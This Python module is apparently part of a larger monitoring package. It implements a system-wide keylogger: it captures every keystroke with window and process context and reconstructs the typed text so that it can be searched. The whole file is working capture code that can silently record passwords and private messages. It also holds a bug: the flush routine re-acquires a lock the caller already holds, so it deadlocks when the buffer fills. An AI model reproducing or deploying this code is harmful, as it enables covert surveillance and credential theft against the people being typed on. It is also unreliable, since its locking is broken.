"""
Keystroke Logger Module
Captures all keystrokes with context
"""
import re
import threading
import time
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key

from ..config import KEYSTROKE_BUFFER_SIZE, KEYSTROKE_BUFFER_TIMEOUT, DEBUG_MODE


class KeystrokeLogger:
    """Captures and buffers keystrokes"""
    
    # Special keys mapping
    SPECIAL_KEYS = {
        Key.space: ' ',
        Key.enter: '[ENTER]\n',
        Key.tab: '[TAB]',
        Key.backspace: '[BACKSPACE]',
        Key.delete: '[DELETE]',
        Key.esc: '[ESC]',
        Key.caps_lock: '[CAPSLOCK]',
        Key.shift: '[SHIFT]',
        Key.shift_r: '[SHIFT]',
        Key.ctrl_l: '[CTRL]',
        Key.ctrl_r: '[CTRL]',
        Key.alt_l: '[ALT]',
        Key.alt_r: '[ALT]',
        Key.cmd: '[WIN]',
        Key.up: '[UP]',
        Key.down: '[DOWN]',
        Key.left: '[LEFT]',
        Key.right: '[RIGHT]',
        Key.home: '[HOME]',
        Key.end: '[END]',
        Key.page_up: '[PGUP]',
        Key.page_down: '[PGDN]',
        Key.insert: '[INSERT]',
        Key.print_screen: '[PRTSC]',
    }
    
    @staticmethod
    def reconstruct_text(raw_keys: str) -> str:
        """
        Reconstruct the final typed text by applying backspaces/deletes.
        This makes the text searchable (e.g., "hello dear[BACKSPACE]x4 alex" -> "hello alex")
        """
        result = []
        i = 0
        
        while i < len(raw_keys):
            # Check for special keys
            if raw_keys[i] == '[':
                # Find the closing bracket
                end = raw_keys.find(']', i)
                if end != -1:
                    special = raw_keys[i:end+1]
                    
                    if special == '[BACKSPACE]':
                        # Remove last character if exists
                        if result:
                            result.pop()
                    elif special == '[DELETE]':
                        # DELETE typically removes char at cursor - for simplicity, ignore
                        pass
                    elif special == '[ENTER]':
                        result.append('\n')
                    elif special == '[TAB]':
                        result.append('\t')
                    elif special.startswith('[CTRL+') or special.startswith('[ALT+'):
                        # Shortcuts don't produce text, skip them
                        pass
                    # Other special keys (arrows, etc.) don't add text
                    
                    i = end + 1
                    # Handle newline after [ENTER]
                    if special == '[ENTER]' and i < len(raw_keys) and raw_keys[i] == '\n':
                        i += 1
                    continue
            
            # Regular character
            result.append(raw_keys[i])
            i += 1
        
        return ''.join(result)
    
    def __init__(self, event_callback):
        """
        Initialize keystroke logger
        
        Args:
            event_callback: Function to call with keystroke events
        """
        self.event_callback = event_callback
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.last_keystroke = time.time()  # Track last keystroke for inactivity detection
        self.active_window = None
        self.active_process = None
        self.listener = None
        self.flush_thread = None
        self.running = False
        
        # Modifier state
        self.shift_pressed = False
        self.ctrl_pressed = False
        self.alt_pressed = False
    
    def set_active_window(self, window_title: str, process_name: str):
        """Update the current active window context"""
        self.active_window = window_title
        self.active_process = process_name
    
    def _on_press(self, key):
        """Handle key press event"""
        try:
            # Track modifier state
            if key in (Key.shift, Key.shift_r):
                self.shift_pressed = True
                return
            elif key in (Key.ctrl_l, Key.ctrl_r):
                self.ctrl_pressed = True
                return
            elif key in (Key.alt_l, Key.alt_r):
                self.alt_pressed = True
                return
            
            # Get the character/key representation
            if hasattr(key, 'char') and key.char:
                char = key.char
            elif key in self.SPECIAL_KEYS:
                char = self.SPECIAL_KEYS[key]
            else:
                char = f'[{str(key)}]'
            
            # Add modifier prefixes for shortcuts
            if self.ctrl_pressed and len(char) == 1:
                char = f'[CTRL+{char.upper()}]'
            elif self.alt_pressed and len(char) == 1:
                char = f'[ALT+{char.upper()}]'
            
            # Add to buffer
            with self.buffer_lock:
                self.buffer.append({
                    'char': char,
                    'timestamp': datetime.utcnow().isoformat(),
                    'window': self.active_window,
                    'process': self.active_process
                })
                
                # Update last keystroke time for inactivity detection
                self.last_keystroke = time.time()
                
                # Flush if buffer is full
                if len(self.buffer) >= KEYSTROKE_BUFFER_SIZE:
                    self._flush_buffer()
                    
        except Exception as e:
            if DEBUG_MODE:
                print(f"Keystroke error: {e}")
    
    def _on_release(self, key):
        """Handle key release event"""
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = False
        elif key in (Key.ctrl_l, Key.ctrl_r):
            self.ctrl_pressed = False
        elif key in (Key.alt_l, Key.alt_r):
            self.alt_pressed = False
    
    def _flush_buffer(self):
        """Flush keystroke buffer to event callback"""
        with self.buffer_lock:
            if not self.buffer:
                return
            
            # Group keystrokes by window/process
            current_group = None
            groups = []
            
            for keystroke in self.buffer:
                key = (keystroke['window'], keystroke['process'])
                if current_group is None or current_group['key'] != key:
                    if current_group:
                        groups.append(current_group)
                    current_group = {
                        'key': key,
                        'chars': keystroke['char'],
                        'start_time': keystroke['timestamp'],
                        'end_time': keystroke['timestamp']
                    }
                else:
                    current_group['chars'] += keystroke['char']
                    current_group['end_time'] = keystroke['timestamp']
            
            if current_group:
                groups.append(current_group)
            
            # Send events
            for group in groups:
                window, process = group['key']
                raw_keys = group['chars']
                
                # Reconstruct the final text (applies backspaces/deletes)
                reconstructed = self.reconstruct_text(raw_keys)
                
                self.event_callback({
                    'timestamp': group['start_time'],
                    'event_type': 'keystroke',
                    'category': 'input',
                    'data': {
                        'keys': raw_keys,
                        'text': reconstructed,  # Final searchable text
                        'target_window': window,
                        'target_process': process,
                        'duration_chars': len(raw_keys)
                    }
                })
            
            self.buffer.clear()
            self.last_flush = time.time()
    
    def _flush_timer(self):
        """Background thread to flush buffer after inactivity timeout"""
        while self.running:
            time.sleep(1)
            # Flush only if there's been no typing for KEYSTROKE_BUFFER_TIMEOUT seconds
            # This ensures we capture complete phrases before sending
            with self.buffer_lock:
                has_content = len(self.buffer) > 0
            
            if has_content and (time.time() - self.last_keystroke >= KEYSTROKE_BUFFER_TIMEOUT):
                self._flush_buffer()
    
    def start(self):
        """Start the keystroke logger"""
        if self.running:
            return
        
        self.running = True
        
        # Start flush timer thread
        self.flush_thread = threading.Thread(target=self._flush_timer, daemon=True)
        self.flush_thread.start()
        
        # Start keyboard listener
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()
        
        if DEBUG_MODE:
            print("Keystroke logger started")
    
    def stop(self):
        """Stop the keystroke logger"""
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        # Final flush
        self._flush_buffer()
        
        if DEBUG_MODE:
            print("Keystroke logger stopped")

